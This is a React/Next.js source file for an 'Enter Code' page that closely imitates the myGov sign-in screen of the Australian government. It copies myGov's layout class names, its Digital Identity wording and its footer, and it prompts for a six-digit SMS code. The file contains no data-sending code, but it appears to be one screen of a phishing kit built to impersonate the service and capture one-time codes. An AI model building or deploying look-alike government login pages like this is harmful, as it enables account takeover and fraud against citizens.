"use client";

export default function Otp() {
  return (
    <>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a href="#" className="unauth-crest__link">
                  <img
                    id="unauth-crest"
                    src="/logo-black.svg"
                    alt="logo"
                    role="img"
                  />
                </a>
                <div className="header-links">
                  <a href="#">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <a data-go-back-link="" className="button-back" href="#"
                      >Back</a
                      >
                      <h1>Enter Code</h1>

                      <form>
                        <div className="input-group">
                          <p>We sent a code by SMS to your mobile number</p>
                          <div className="code-container">
                            <label htmlFor="confirmation-code"
                            >Code
                              <input
                                id="code"
                                name="code"
                                data-number-email-input="data-number-email-input"
                                type="tel"
                                className="security-code"
                                value=""
                                maxLength="6"
                                required
                                onChange={(e) => { }}
                              />
                            </label>
                            <p style={{ fontSize: 14 }}>
                              If you don&apos;t want to use Digital Identity, you can
                              <a>call the helpdesk</a> to create a new myGov
                              account.
                            </p>
                            <a
                              data-infotext-continue=""
                              className="continue-digital-identity-chevron"
                              href="#"
                            >Continue with Digital Identity</a
                            >
                          </div>
                          <br />
                          <div className="button-digital-id-main-container override">
                            <div className="digital-id-button-container">
                              <button
                                type="submit"
                                className="button-main"
                                name="btn2"
                                id="btn2"
                              >
                                Next
                              </button>
                            </div>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">
            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">Footer</h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="#">Terms of use</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Privacy and security</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Copyright</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="#">
                  <img
                    src="/logo-white.svg"
                    alt="logo"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live on.
                We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
